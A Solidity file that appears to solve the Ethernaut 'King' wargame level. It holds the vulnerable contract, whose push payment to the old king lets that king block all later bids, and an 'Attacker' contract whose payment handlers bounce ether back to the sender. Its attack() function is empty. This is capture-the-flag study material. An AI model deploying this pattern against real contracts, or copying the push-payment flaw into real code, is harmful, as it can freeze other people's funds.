// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {
  address payable king;
  uint256 public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

contract Attacker {
  fallback() external payable {
    address payable king = payable(msg.sender);
    king.transfer(msg.value);
  }

  receive() external payable {
    address payable king = payable(msg.sender);
    king.transfer(msg.value);
  }

  function attack() external payable {}

  function getBalance() public view returns (uint256) {
    return address(this).balance;
  }
}